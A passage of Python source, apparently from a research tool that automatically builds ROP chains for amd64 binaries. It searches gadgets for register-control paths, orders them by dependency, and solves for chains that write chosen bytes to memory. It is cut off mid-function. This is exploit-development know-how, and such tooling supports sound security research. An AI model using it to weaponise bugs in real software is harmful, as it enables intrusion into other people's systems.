from pwn import *
from itertools import permutations
import json
import copy
import time
import datetime
import solve_engine
import tools
import queue
import random
from loguru import logger
context.arch = 'amd64'
def target_reg_end(target_regs,controllable_reg):
    for i in target_regs:
        if i not in controllable_reg:
            return False
    return True

def get_edges(gadgets_dict,controllable_reg,target_regs,depth=3):

    controllable_reg2 = controllable_reg.copy()
    edges = []
    for addr, gadget_str in gadgets_dict.items():
        gadget_info = tools.Analysis_gadget(gadget_str)
        rip_info = tools.Analysis_rip(gadget_str)
        if gadget_info and rip_info:
            # 判断可修改的寄存器列表是否为空，劫持控制流的寄存器是否为空，内存访问相关寄存器是否为空，条件跳转寄存器是否为空
            if len(gadget_info['can_change_regs'])!=0 and len(gadget_info['hijack_reg'])!=0 and mem_is_controllable(gadget_info,controllable_reg) and len(gadget_info['condition_reg'])==0:
                # 判断劫持控制流的寄存器是否为可控寄存器，以保证在构建链的时候控制流始终被劫持
                if gadget_info['hijack_reg'][0]['reg_name'] in controllable_reg:
                    # 遍历可修改的寄存器列表，寻找能够修改其他寄存器的gadget
                    for i in range(len(gadget_info['can_change_regs'])):
                        # 满足条件：可修改寄存器的源寄存器是可控的，源寄存器不能是劫持控制流的寄存器，可修改寄存器不能是rsp寄存器
                        if (gadget_info['can_change_regs'][i]['src_reg'] in controllable_reg) and (gadget_info['can_change_regs'][i]['src_reg'] != gadget_info['hijack_reg'][0]['reg_name'] or (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']=="mem_value")):
                            # 结束条件1：劫持控制流的寄存器是rsp寄存器 或者 可修改寄存器的源寄存器是rsp寄存器 或者 可修改寄存器是rsp寄存器               rsp是栈指针，轻易不修改，可控的是rsp指向的内存，而不是rsp寄存器
                            if (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']!="mem_value") or (gadget_info['can_change_regs'][i]['src_reg'] == 'rsp' and gadget_info['can_change_regs'][i]['src_reg_type'] != 'mem_value') or gadget_info['can_change_regs'][i]['reg_name'] == 'rsp':
                                # if recover_rsp_flag:gadget_info['can_change_regs'][i]['src_reg'] = ["rsp"]
                                break
                            # 遍历可修改的寄存器，来添加边的信息
                            for j in range(len(gadget_info['can_change_regs'])):
                                # 添加边满足条件：可修改寄存器字节大于32，可修改寄存器的源寄存器是可控的，可修改寄存器的源寄存器不能和自己相同，可修改寄存器不是前一轮可控寄存器                          
                                if gadget_info['can_change_regs'][j]['bit'] >= 32 and gadget_info['can_change_regs'][j]['src_reg'] in controllable_reg and gadget_info['can_change_regs'][j]['src_reg'] != gadget_info['can_change_regs'][j]['reg_name'] and gadget_info['can_change_regs'][j]['reg_name'] not in controllable_reg:
                                    if (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']!="mem_value") or (gadget_info['can_change_regs'][j]['src_reg'] == 'rsp' and gadget_info['can_change_regs'][j]['src_reg_type'] != 'mem_value') or gadget_info['can_change_regs'][j]['reg_name'] == 'rsp':
                                            continue
                                    edges.append({'dst':gadget_info['can_change_regs'][j]['reg_name'],'src':gadget_info['can_change_regs'][j]['src_reg'],'addr':addr,'rip':rip_info['reg_name']})
                                    # 添加可控寄存器条件：可修改寄存器字节大于32，可修改寄存器不在新一轮的可控寄存器中，可修改寄存器的源寄存器不是rsp寄存器
                                    if gadget_info['can_change_regs'][j]['bit'] >= 32 and gadget_info['can_change_regs'][j]['reg_name'] not in controllable_reg2:
                                        if gadget_info['can_change_regs'][j]['src_reg'] == "rsp" and gadget_info['can_change_regs'][j]['src_reg_type'] != "value":
                                            controllable_reg2.append(gadget_info['can_change_regs'][j]['reg_name'])
                            break

    while 1:
        controllable_reg3 = controllable_reg2.copy()
        for addr, gadget_str in gadgets_dict.items():
            gadget_info = tools.Analysis_gadget(gadget_str) # 修改tools.Analysis_gadget的逻辑，对gadget内部的数据流进行梳理
            rip_info = tools.Analysis_rip(gadget_str)
            if gadget_info and rip_info:
                if len(gadget_info['can_change_regs'])!=0 and len(gadget_info['hijack_reg'])!=0 and mem_is_controllable(gadget_info, controllable_reg) and len(gadget_info['condition_reg'])==0:
                    if gadget_info['hijack_reg'][0]['reg_name'] in controllable_reg2 or gadget_info['hijack_reg'][0]['reg_name'] in [_["reg_name"] for _ in gadget_info['can_change_regs']]:
                        for i in range(len(gadget_info['can_change_regs'])):
                            if gadget_info['can_change_regs'][i]['src_reg'] in controllable_reg2 and gadget_info['can_change_regs'][i]['bit'] >= 32 and (gadget_info['can_change_regs'][i]['reg_name'] not in controllable_reg2 or gadget_info['can_change_regs'][i]['reg_name'] in target_regs) and (gadget_info['can_change_regs'][i]['src_reg'] != gadget_info['hijack_reg'][0]['reg_name'] or (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']=="mem_value")):
                                if (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']!="mem_value") or (gadget_info['can_change_regs'][i]['src_reg'] == 'rsp' and gadget_info['can_change_regs'][i]['src_reg_type'] != 'mem_value') or gadget_info['can_change_regs'][i]['reg_name'] == 'rsp':
                                    break
                                for j in range(len(gadget_info['can_change_regs'])):
                                    if gadget_info['can_change_regs'][j]['bit'] >= 32 and gadget_info['can_change_regs'][j]['src_reg'] in controllable_reg2 and gadget_info['can_change_regs'][j]['src_reg'] != gadget_info['can_change_regs'][j]['reg_name'] and (gadget_info['can_change_regs'][j]['reg_name'] not in controllable_reg2 or gadget_info['can_change_regs'][j]['reg_name'] in target_regs) and (gadget_info['can_change_regs'][j]['src_reg'] != gadget_info['hijack_reg'][0]['reg_name'] or (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']=="mem_value")):
                                        if (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']!="mem_value") or (gadget_info['can_change_regs'][j]['src_reg'] == 'rsp' and gadget_info['can_change_regs'][j]['src_reg_type'] != 'mem_value') or gadget_info['can_change_regs'][j]['reg_name'] == 'rsp':
                                            continue
                                        can_change_regs_name = [_["reg_name"] for _ in gadget_info['can_change_regs']]
                                        if gadget_info['hijack_reg'][0]['reg_name'] in can_change_regs_name:
                                            rip_reg = gadget_info['can_change_regs'][can_change_regs_name.index(gadget_info['hijack_reg'][0]['reg_name'])]['src_reg']
                                            edges.append({'dst':gadget_info['can_change_regs'][j]['reg_name'],'src':gadget_info['can_change_regs'][j]['src_reg'],'addr':addr,'rip':rip_reg})
                                        else:
                                            edges.append({'dst':gadget_info['can_change_regs'][j]['reg_name'],'src':gadget_info['can_change_regs'][j]['src_reg'],'addr':addr,'rip':rip_info['reg_name']})
                                        if gadget_info['can_change_regs'][j]['bit'] >= 32 and gadget_info['can_change_regs'][j]['reg_name'] not in controllable_reg3:
                                            controllable_reg3.append(gadget_info['can_change_regs'][j]['reg_name'])
                                break
        if controllable_reg3 == controllable_reg2:
            break
        controllable_reg2 = controllable_reg3
    for addr, gadget_str in gadgets_dict.items():
        gadget_info = tools.Analysis_gadget(gadget_str) # 修改tools.Analysis_gadget的逻辑，对gadget内部的数据流进行梳理
        rip_info = tools.Analysis_rip(gadget_str)
        if gadget_info and rip_info:
            if len(gadget_info['can_change_regs'])!=0 and len(gadget_info['hijack_reg'])!=0 and len(gadget_info['condition_reg'])==0:
                if gadget_info['hijack_reg'][0]['reg_name'] in controllable_reg3 or gadget_info['hijack_reg'][0]['reg_name'] in [_["reg_name"] for _ in gadget_info['can_change_regs']]:
                    for i in range(len(gadget_info['can_change_regs'])):
                        # 去掉的条件 gadget_info['can_change_regs'][i]['src_reg'] in controllable_reg2 and 
                        if gadget_info['can_change_regs'][i]['bit'] >= 32 and gadget_info['can_change_regs'][i]['src_reg_type'] in ["mem_value","num", "value"] and (gadget_info['can_change_regs'][i]['src_reg'] in controllable_reg3 or gadget_info['can_change_regs'][i]['src_reg'] == "immediate_num") and gadget_info['can_change_regs'][i]['reg_name'] in target_regs and (gadget_info['can_change_regs'][i]['src_reg'] != gadget_info['hijack_reg'][0]['reg_name'] or (gadget_info['hijack_reg'][0]['reg_name']=='rsp' and gadget_info['hijack_reg'][0]['type']=="mem_value")):
                            can_change_regs_name = [_["reg_name"] for _ in gadget_info['can_change_regs']]
                            if gadget_info['hijack_reg'][0]['reg_name'] in can_change_regs_name:
                                rip_reg = gadget_info['can_change_regs'][can_change_regs_name.index(gadget_info['hijack_reg'][0]['reg_name'])]['src_reg']
                                edges.append({'dst':gadget_info['can_change_regs'][i]['reg_name'],'src':gadget_info['can_change_regs'][i]['src_reg'],'addr':addr,'rip':rip_reg})
                            else:
                                edges.append({'dst':gadget_info['can_change_regs'][i]['reg_name'],'src':gadget_info['can_change_regs'][i]['src_reg'],'addr':addr,'rip':rip_info['reg_name']})
                            if gadget_info['can_change_regs'][i]['bit'] >= 32 and gadget_info['can_change_regs'][i]['reg_name'] not in controllable_reg3:
                                controllable_reg3.append(gadget_info['can_change_regs'][i]['reg_name'])
    if not target_reg_end(target_regs,controllable_reg3):

        return None

    dele_edges = []
    for i in range(len(edges)):
        tmp_last_gadget_info = tools.Analysis_gadget(gadgets_dict[edges[i]['addr']].split(" ; ")[-1])
        rip_reg_name = tmp_last_gadget_info['hijack_reg'][0]
        
        gadgets_list = gadgets_dict[edges[i]['addr']].split(" ; ")
        f = False
        for i1 in range(len(gadgets_list)-1):
            if f:
                break
            if gadgets_list[i1] == "leave":
                continue 
            g_info = tools.Analysis_gadget(gadgets_list[i1])
            if not g_info:
                f = True
                break
            for i2 in range(len(g_info['can_change_regs'])):
                if g_info['can_change_regs'][i2]['reg_name'] == rip_reg_name['reg_name'] or g_info['can_change_regs'][i2]['reg_name'] == g_info['can_change_regs'][i2]['src_reg']:
                    f = True
                    break
        if f:
            continue
        tmp = tools.Analysis_gadget(gadgets_list[0])['can_change_regs']
        if rip_reg_name["reg_name"] in [_['reg_name'] for _ in tmp] and rip_reg_name["reg_name"] != "rsp":
            change_log = []
            if len(gadgets_list) >= 3:
                for j in range(1,len(gadgets_list)-1):
                    now_gadget_info = tools.Analysis_gadget(gadgets_list[j])['can_change_regs']
                    for j0 in range(len(now_gadget_info)):
                        dst = now_gadget_info[j0]['reg_name']
                        src = now_gadget_info[j0]["src_reg"]
                        for j1 in range(len(change_log)):
                            if src == change_log[j1][0]:
                                change_log.append((dst,change_log[j1][1]))
                            elif dst == change_log[j1][0]:
                                change_log[j1] = (dst,src)
                            break
                        if (dst,src) not in change_log:
                            change_log.append((dst,src))
            for j in range(len(change_log)):
                new_edge = {'dst':change_log[j][0],'src':change_log[j][1],'addr':edges[i]['addr'],'rip':edges[i]['rip']}
                if new_edge not in dele_edges:
                    dele_edges.append(new_edge)
        else:
            for t in tmp:
                if t['reg_name'] == edges[i]['dst'] and t['src_reg'] == edges[i]['src']:
                    if edges[i] not in dele_edges:
                        dele_edges.append(edges[i])
                        break

    for i in range(len(dele_edges)):
        if type(dele_edges[i]['dst']) == list and len(dele_edges[i]['dst']) != 0:
            dele_edges[i]['dst'] = dele_edges[i]['dst'][0]
        if type(dele_edges[i]['src']) == list and len(dele_edges[i]['src']) != 0:
            dele_edges[i]['src'] = dele_edges[i]['src'][0]
    edges = dele_edges
    
    return edges

def mem_is_controllable(gadget_info,controllable_reg):
    valid_mem_regs = gadget_info['valid_mem_reg']
    if len(valid_mem_regs) == 0:
        return True
    else:
        for i in range(len(valid_mem_regs)):
            if type(valid_mem_regs[i]['reg_name']) == list:
                for r in valid_mem_regs[i]['reg_name']:
                    if r not in controllable_reg and r != 'rsp':
                        return False
            else:
                if valid_mem_regs[i]['reg_name'] not in controllable_reg and valid_mem_regs[i]['reg_name'] != 'rsp':
                    return False
        return True

def is_valid_dependency(s,reg_dependency_list):
    for i in range(len(reg_dependency_list)):
        for j in range(i+1,len(reg_dependency_list)):
            if reg_dependency_list[s[i]]['main'] in reg_dependency_list[s[j]]['side']:
                return False
    return True
def get_reg_dependency(seq,gadgets_dict,controllable_reg,target_regs,reg):
    gadget_seq = [gadgets_dict[_] for _ in seq]
    tmp = []
    for i0 in range(len(gadget_seq)):
        analysis_res = tools.Analysis_gadget(gadget_seq[i0])
        if "xchg" in gadget_seq[i0]:
            for j in range(len(analysis_res['can_change_regs'])):
                front_dst = []
                for k0 in range(i0):
                    for k in range(len(tmp[k0]['can_change_regs'])):
                        front_dst.append(tmp[k0]['can_change_regs'][k]['reg_name'])
                if analysis_res['can_change_regs'][j]['src_reg'] in front_dst or analysis_res['can_change_regs'][j]['src_reg'] in controllable_reg:
                    analysis_res['can_change_regs'] = [analysis_res['can_change_regs'][j]]
                    break
        tmp.append(analysis_res)
    change_tmps = []
    for i1 in range(len(tmp)):
        if len(tmp[i1]['can_change_regs'])>1:
            f = 0
            for j in range(len(tmp[i1]['can_change_regs'])):
                front_dst = []
                for k0 in range(i1):
                    for k in range(len(tmp[k0]['can_change_regs'])):
                        front_dst.append(tmp[k0]['can_change_regs'][k]['reg_name'])
                if (tmp[i1]['can_change_regs'][j]['src_reg'] in front_dst or tmp[i1]['can_change_regs'][j]['src_reg'] in controllable_reg) and f == 0:
                    change_tmps.append(tmp[i1]['can_change_regs'][j]['reg_name'])
                    f = 1
                else:
                    change_tmps.append(tmp[i1]['can_change_regs'][j]['reg_name'])
        else:
            change_tmps.append(tmp[i1]['can_change_regs'][0]['reg_name'])
    res = []
    for r in range(len(change_tmps)):
        if change_tmps[r] in target_regs and change_tmps[r] != reg:
            res.append(change_tmps[r])
    return {"main":reg,"side":res}

def get_valid_gadget_seq(seqs,gadgets_dict,controllable_reg,target_regs):
    reg_dependency_list = []
    for seq in seqs:
        reg_dependency_list.append(get_reg_dependency(seq,gadgets_dict,controllable_reg,target_regs,target_regs[seqs.index(seq)]))
    num_seqs = [_ for _ in range(len(seqs))]
    valid_gadget_seq_list = []
    for s in permutations(num_seqs):
        if is_valid_dependency(s,reg_dependency_list):
            valid_gadget_seq_list.append([seqs[_] for _ in s])
    return valid_gadget_seq_list

def sigle_gadget_chain_valid_solve(gadgets_info,seq,target_reg):
    gadgets_info_copy = copy.deepcopy(gadgets_info)
    target_regs_bak = gadgets_info_copy.target_regs
    target_regs_list = [_['reg_name'] for _ in target_regs_bak]
    gadgets_info_copy.target_regs = [gadgets_info_copy.target_regs[target_regs_list.index(target_reg)]]
    tmp_res = solve_engine.solve(seq,gadgets_info_copy)
    if not tmp_res:
        return False
    else:
        if solve_engine.check(gadgets_info_copy,tmp_res)[0]:
            return True
        else:
            tmp_res_bak = tmp_res.copy()
            solve_engine.resolve(gadgets_info_copy,tmp_res)
            if solve_engine.check(gadgets_info_copy,tmp_res)[0]:
                return True
            else:
                target_regs_bak = gadgets_info_copy.target_regs.copy()
                for i in range(len(gadgets_info_copy.target_regs)):
                    gadgets_info_copy.target_regs[i]['reg_value'] = gadgets_info_copy.target_regs[i]['reg_value']^0x11111111
                solve_res_p = solve_engine.solve(seq,gadgets_info_copy)
                solve_engine.resolve(gadgets_info_copy, tmp_res_bak, solve_res_p)
                if solve_engine.check(gadgets_info_copy, tmp_res_bak)[0]:
                    return True
                gadgets_info_copy.target_regs = target_regs_bak
            return False
        
def timeout_handler(signum, frame):
    raise TimeoutError("Function took too long to execute")

def get_mem_write_gadget_chain(gadgets_info,write_addr,write_data,search_depth=1,valid_mem_reg_num=1,reg_timeout=90):
    global stop_event
    global all_path
    find_no_path_within_time_reg = []
    gadgets_info_copy = copy.deepcopy(gadgets_info)
    gadgets_dict = gadgets_info_copy.gadgets_dict
    controllable_reg = gadgets_info_copy.controllable_regs
    no_result_reg_group = []
    edges_reg_group = {}
    for addr, gadget in gadgets_dict.items():
        gadget_s = gadget.split(" ; ")
        gadget_info = tools.Analysis_gadget(gadget)
        if gadget_info != False:
            gadget_0_info = tools.Analysis_op(gadget_s[0])
            if gadget_0_info != None and type(gadget_0_info)!=list:
                if gadget_0_info["dst"]['type'] == 'mem_value' and type(gadget_0_info["dst"]['reg_name'])!=list and len(gadget_info['hijack_reg'])!=0 and len(gadget_info['condition_reg'])==0 and len(gadget_info['valid_mem_reg'])<=valid_mem_reg_num:
                    if len(gadget_0_info['dst']['expr'].split(" ")) > 3:
                        continue
                    logger.debug(f"{addr} -> {gadget}")
                    mem_reg = gadget_0_info["dst"]
                    rip_reg = gadget_info['hijack_reg'][0]
                    src_reg = gadget_0_info["src"]
                    mem_reg_name = mem_reg['reg_name']
                    rip_reg_name = rip_reg['reg_name']
                    src_reg_name = src_reg['reg_name']
                    if mem_reg_name in find_no_path_within_time_reg or rip_reg_name in find_no_path_within_time_reg or src_reg_name in find_no_path_within_time_reg:
                        continue
                    if type(rip_reg_name) == list or type(mem_reg_name) == list or type(src_reg_name) == list:
                        continue
                    if len(set([mem_reg_name,rip_reg_name,src_reg_name])) == len([mem_reg_name,rip_reg_name,src_reg_name]) and src_reg_name != 'immediate_num' and mem_reg_name != 'immediate_num' and rip_reg_name != 'immediate_num': 
                        a = [mem_reg_name,rip_reg_name,src_reg_name]
                        a.sort()
                        if a in no_result_reg_group:
                            continue
                        logger.info(f"Get Set Mem Edges")
                        if tuple(a) in edges_reg_group:
                            edges = edges_reg_group[tuple(a)]
                        else:
                            edges = get_edges(gadgets_dict,controllable_reg,[mem_reg_name,rip_reg_name,src_reg_name],1)
                            if edges == None:
                                b = [mem_reg_name,rip_reg_name,src_reg_name]
                                b.sort()
                                no_result_reg_group.append(b)
                                continue
                            edges_reg_group[tuple(a)] = edges
                        global_target_regs = gadgets_info_copy.target_regs
                        tmp = []
                        tmp2 = []
                        n = 1
                        reg_flag = {}
                        funcreg = ['mem_dst','src_dst','rip']
                        reg_three = [mem_reg_name,src_reg_name,rip_reg_name]
                        for r_i in range(len(reg_three)):
                            if reg_three[r_i] not in controllable_reg or r_i < 2:
                                tmp.append({"reg_name":reg_three[r_i],"reg_value":(n<<28)+0x200})
                                tmp2.append(reg_three[r_i])
                                reg_flag[n]=funcreg[r_i]
                                n+=1
                        if len(tmp)>2:
                            continue
                        gadgets_info_copy.target_regs = tmp
                        # 设置超时时间为5秒
                        # signal.signal(signal.SIGALRM, timeout_handler)
                        # signal.alarm(90)
                        # try:
                        # edges_no_condition = sort_edges_condition(gadgets_info,edges)
                        edges_no_condition = sort_edges(gadgets_info,edges)
                            # solve_res_seq = get_valid_reg_chain_threads(gadgets_info_copy,tmp2,edges_no_condition,controllable_reg,gadgets_dict)
                        solve_res_seq = get_valid_reg_chain_threads(gadgets_info_copy,tmp2,edges_no_condition,controllable_reg,gadgets_dict,search_depth,timeout=reg_timeout,mode=0)
                            # signal.alarm(0)  # 取消闹钟
                        # except TimeoutError as e:
                        #     stop_event.set()
                        #     for r, path in all_path.items():
                        #         if len(path) == 0:
                        #             find_no_path_within_time_reg.append(r)
                        #     logger.exception(f"Caught timeout error: {e}")
                        #     sleep(1)
                        #     continue
                        if not solve_res_seq:
                            for r, path in all_path.items():
                                if len(path) == 0:
                                    find_no_path_within_time_reg.append(r)
                            continue
                        solve_res = solve_res_seq[0][0]
                        seq_p = tools.trans_to_list(solve_res_seq[0][1])
                        tmp_copy = tmp.copy()
                        mem_value_map = {}
                        for tmp_i in range(len(tmp_copy)):
                            tmp_copy[tmp_i]['reg_value'] = tmp_copy[tmp_i]['reg_value']*2
                            gadgets_info_copy.target_regs = tmp_copy
                            solve_res_tmp = solve_engine.solve([seq_p],gadgets_info_copy)
                            if not solve_res_tmp:
                                break
                            tmp_copy[tmp_i]['reg_value'] = tmp_copy[tmp_i]['reg_value']//2
                            for i,v in solve_res_tmp.items():
                                # 这里是为了确定寄存器的值分别是哪个位置的值影响的，可读写的地址可不考虑，同时前后不同的偏移也是不用考虑的
                                if i in solve_res and not solve_engine.check_address_rw(gadgets_info,eval(solve_res_tmp[i])) and eval(solve_res_tmp[i])&0xffffff00!=0xdeadbe00 and abs(eval(solve_res_tmp[i])-eval(solve_res[i]))>=0x2000:
                                    mem_value_map[funcreg[tmp2.index(tmp_copy[tmp_i]['reg_name'])]] = i
                                    break
                        if len(mem_value_map) != len(tmp_copy):
                            gadgets_info_copy.target_regs = gadgets_info.target_regs
                            continue
                        seq_p.append(addr)
                        c_n = 0
                        chain_part = []
                        solve_se = []
                        error = False
                        for j in range(len(write_data)*8//mem_reg['bit']):
                            if error:
                                break
                            chain_part.append(seq_p)
                            write_bytes = write_data[c_n:c_n+mem_reg['bit']//8]
                            expr = gadget_0_info['dst']['expr']
                            offset_str = expr.split(" ")
                            if len(offset_str) == 1:
                                offset = 0
                            else:
                                try:
                                    offset = eval(offset_str[-2]+offset_str[-1])
                                except:
                                    error = True
                                    gadgets_info_copy.target_regs = global_target_regs
                                    gadgets_info_copy.regs_init = gadgets_info.regs_init
                                    gadgets_info_copy.offset_list = gadgets_info.offset_list
                                    continue
                            write_addr_current = (write_addr - offset + c_n)&0xffffffffffffffff
                            
                            # r_0[mem_value_map['mem_dst']] = hex(write_addr_current)
                            tmp[funcreg.index('mem_dst')]['reg_value'] = write_addr_current
                            if gadget.split(" ; ")[0].split(" ")[-1] in ["ah","bh","ch","dh"]:
                                # r_0[mem_value_map['src_dst']] = hex(int.from_bytes(write_bytes)<<8)
                                tmp[funcreg.index('src_dst')]['reg_value'] = (int.from_bytes(write_bytes,'little'))<<8
                            else:
                                # r_0[mem_value_map['src_dst']] = hex(int.from_bytes(write_bytes))
                                tmp[funcreg.index('src_dst')]['reg_value'] = (int.from_bytes(write_bytes,'little'))
                            gadgets_info_copy.target_regs = tmp
                            r_0 = solve_engine.solve([seq_p[:-1],[seq_p[-1]]],gadgets_info_copy)
                            if not r_0:
                                error = True
                                gadgets_info_copy.target_regs = global_target_regs
                                gadgets_info_copy.regs_init = gadgets_info.regs_init
                                gadgets_info_copy.offset_list = gadgets_info.offset_list
                                continue
                            gadgets_info_copy.target_regs=[{'reg_name':'rip','reg_value':0xdeadbe00+j}]
                            rip_res = solve_engine.solve([seq_p[:-1],[seq_p[-1]]],gadgets_info_copy)
                            if not rip_res:
                                error = True
                                gadgets_info_copy.target_regs = global_target_regs
                                gadgets_info_copy.regs_init = gadgets_info.regs_init
                                gadgets_info_copy.offset_list = gadgets_info.offset_list
                                continue
                            gadgets_info_copy.target_regs = tmp
                            if 'rip' in mem_value_map:
                                r_0[mem_value_map['rip']] = rip_res[mem_value_map['rip']]
                            r_0_new = {}
                            for idx, v in r_0.items():
                                if idx*8+gadgets_info_copy.controble_addr_base >= gadgets_info_copy.my_virtual_mem_info[0]:
                                    continue
                                r_0_new[idx] = v
                            for idx, v in rip_res.items():
                                if idx*8+gadgets_info_copy.controble_addr_base >= gadgets_info_copy.my_virtual_mem_info[0]:
                                    r_0_new[idx] = rip_res[idx]
                            gadgets_info_copy.target_regs = [{write_addr+c_n:write_bytes}]
                            gadgets_info_copy.target_mem_value = [{write_addr+c_n:write_bytes}]
                            c = 0
                             
                            while True:
                                r_0_new_re = True
                                check_res = solve_engine.check_mem(gadgets_info_copy,r_0_new)
                                if c >= 3 or check_res[0] or eval(check_res[1])&0xffffff00 != 0xdeadbe00:
                                    break
                                r_0_new_re = solve_engine.resolve_mem_write(gadgets_info_copy,r_0_new,mem_value_map['mem_dst'],write_addr_current)
                                if not r_0_new_re:
                                    break
                                r_0_new = r_0_new_re
                                c += 1
                            if not r_0_new_re:
                                error = True
                                gadgets_info_copy.target_regs = global_target_regs
                                gadgets_info_copy.regs_init = gadgets_info.regs_init
                                gadgets_info_copy.offset_list = gadgets_info.offset_list
                                continue
                            if not check_res[0] and (c >= 3 or eval(check_res[1])&0xffffff00 != 0xdeadbe00):
                                error = True
                                gadgets_info_copy.target_regs = global_target_regs
                                gadgets_info_copy.regs_init = gadgets_info.regs_init
                                gadgets_info_copy.offset_list = gadgets_info.offset_list
                                continue
                            r_0_new_re = r_0_new
                            gadgets_info_copy.target_mem_value = gadgets_info.target_mem_value
                            solve_se.append(r_0_new_re)
                            
                            regs_state = solve_engine.get_regs_state(gadgets_info_copy,r_0_new_re)
                            # gadgets_info = solve_engine.update_offset_list(gadgets_info_copy,r_0_new_re)
                            gadgets_info_copy.regs_init = regs_state
                            c_n = c_n + mem_reg['bit']//8
                        gadgets_info_copy.regs_init = gadgets_info.regs_init
                        if len(solve_se) != len(write_data)*8//mem_reg['bit']:
                            continue
                        gadgets_info_copy.target_regs = []
                        finall_res = solve_engine.merge_gadgets(gadgets_info_copy,chain_part,solve_se,1)

                        check_res = solve_engine.check_mem(gadgets_info_copy,finall_res)
                        if check_res[0]:
                            finall_chain = []
                            for part in chain_part:
                                finall_chain += part
                            gadgets_info_copy.target_regs = global_target_regs
                            gadgets_info_copy.regs_init = gadgets_info.regs_init
                            gadgets_info_copy.offset_list = gadgets_info.offset_list
                            return (finall_res,finall_chain)
                            
                        gadgets_info_copy.target_regs = global_target_regs
                        gadgets_info_copy.regs_init = gadgets_info.regs_init
                        gadgets_info_copy.offset_list = gadgets_info.offset_list
                        continue
    return (False,False)

def parse_edge(edge_res, res=None, g_res=None):
    if res is None:
        res = []
    if g_res is None:
        g_res = []
    res_bak = res.copy()
    for i in range(len(edge_res)):
        res.append(edge_res[i][-1]['addr'])
        if len(edge_res[i]) == 1:
            if res not in g_res:
                g_res.append(res.copy())  # 注意这里需要复制
        for j in range(len(edge_res[i]) - 1):
            parse_edge(edge_res[i][j], res, g_res)
        res = res_bak.copy()
    return g_res

def parse_edge_new(edge_res):
    g_res = []
    # res = []
    for i in range(len(edge_res)):
        new = []
        for j in range(len(edge_res[i])-1):
            new.append(parse_edge_new(edge_res[i][j]))
        # other = edge_res[i][:-1]
        combine_res = tools.combine_multiple_arrays(*new)
        for k in range(len(combine_res)):
            tmp = []
            for i0 in range(len(combine_res[k])):
                tmp += combine_res[k][i0]
            combine_res[k] = tmp
            combine_res[k].append(edge_res[i][-1]['addr'])
        g_res += combine_res
    return g_res
            

def remove_subpaths(paths):
    cleaned = []
    for i, path_i in enumerate(paths):
        is_subpath = False
        for j, path_j in enumerate(paths):
            if i != j and len(path_i) < len(path_j):
                if path_i == path_j[:len(path_i)]:
                    is_subpath = True
                    break
        if not is_subpath:
            cleaned.append(path_i)
    return cleaned

stop_event = None
all_path = None

import multiprocessing as mp # 替换 threading
from multiprocessing import Manager  # 进程间共享对象

def get_valid_reg_chain_threads(gadgets_info,target_regs,edges,controllable_reg,gadgets_dict, search_depth=1,timeout=3600,mode=0): 
    global stop_event
    global all_path

    manager = Manager()
    stop_event = manager.Event()
    worker_event = manager.Event()
    all_path = manager.dict({reg: manager.list() for reg in target_regs})
    lock = mp.Lock()

    # global stop_event
    # global all_path
    # lock = threading.Lock()
    # 存放各寄存器的结果
    has_been_solved = manager.list()
    has_been_edges = manager.list()
    has_been_explore_edge = manager.dict({reg: manager.list() for reg in target_regs})
    all_queue = {reg: mp.Queue() for reg in target_regs}
    # all_path = {reg: [] for reg in target_regs}
    path_queue = mp.Queue()
    result = manager.list()

    # stop_event = threading.Event()
    # worker_event = threading.Event()
    def get_reg_path_thread(gadgets_info, edges,target_reg,target_value,gadgets_dict,controllable_reg,n,front_reg=None,start_time=0,timeout=0,all_queue=None):
        valid_edges  = []
        if front_reg == None:
            front_reg = []
        if stop_event.is_set():
            return valid_edges
        if len(front_reg) > n:
            return valid_edges
        for i in range(len(edges)):
            if stop_event.is_set():
                return valid_edges
            if target_reg in has_been_explore_edge and edges[i] in has_been_explore_edge[target_reg]:
                continue
            tmp = []
            if edges[i]['dst'] == target_reg:
                solve_res = solve_engine.search_solve(gadgets_dict[edges[i]['addr']],target_reg,target_value,gadgets_info) # 扩展内存访问、立即数需要修改
                if len(solve_res) > 0:
                    c = 0
                    for k,v in solve_res.items():
                        variables = k
                        value = v
                        if "mem" not in variables:
                            if variables in front_reg: # 防止成环
                                break
                            elif variables in controllable_reg:
                                c += 1
                                continue
                            elif variables == target_reg:
                                break
                            else:
                                front_reg.append(target_reg)
                                start_time = time.time()
                                res = get_reg_path_thread(gadgets_info,edges,variables,value,gadgets_dict,controllable_reg,n,front_reg,start_time=start_time,timeout=60,all_queue=all_queue)
                                front_reg.pop(front_reg.index(target_reg))
                                if len(res) > 0:
                                    tmp.append(res)
                                    c += 1
                        else:
                            c += 1
                    if c == len(solve_res):
                        # 找到了路径
                        tmp.append(edges[i])
                        valid_edges.append(tmp)
                        # print(f"{front_reg}   {[tmp]}")
                        if len(front_reg)==0:
                            logger.debug(f"{target_reg} find {[tmp]}")
                            all_queue[target_reg].put([tmp])
                else:
                    if target_reg not in has_been_explore_edge:
                        has_been_explore_edge[target_reg] = []
                    if edges[i] not in has_been_explore_edge[target_reg]:
                        has_been_explore_edge[target_reg].append(edges[i])
            if len(front_reg)!=0 and len(valid_edges) >= 8:
                return valid_edges
            if timeout != 0 and time.time()-start_time > timeout:
                return valid_edges
        return valid_edges

    def worker(gadgets_info,reg,n,all_queue):
        gadgets_info_copy = copy.deepcopy(gadgets_info)
        idx = target_regs.index(reg)
        target_value = gadgets_info.target_regs[idx]['reg_value']
        gadgets_info_copy.target_regs = [{reg:target_value}]
        front_reg=[]
        edge_res = get_reg_path_thread(gadgets_info_copy, edges, reg, target_value, gadgets_dict, controllable_reg,n,front_reg,all_queue=all_queue)

    def monitor(gadgets_info,reg,all_queue,timeout):
        gadgets_info_copy = copy.deepcopy(gadgets_info)
        start = time.time()
        while not stop_event.is_set():
            if time.time() - start > timeout:
                stop_event.set()
                worker_event.set()
                return False
            if all_queue[reg].empty() == False:
                edges_r = all_queue[reg].get()
                if edges_r not in has_been_edges:
                    has_been_edges.append(edges_r)
                    logger.debug(f"monitor {reg} {edges_r}")
                    g_res = parse_edge_new(edges_r)
                    filtered_paths = remove_subpaths(g_res)
                    for seq in filtered_paths:
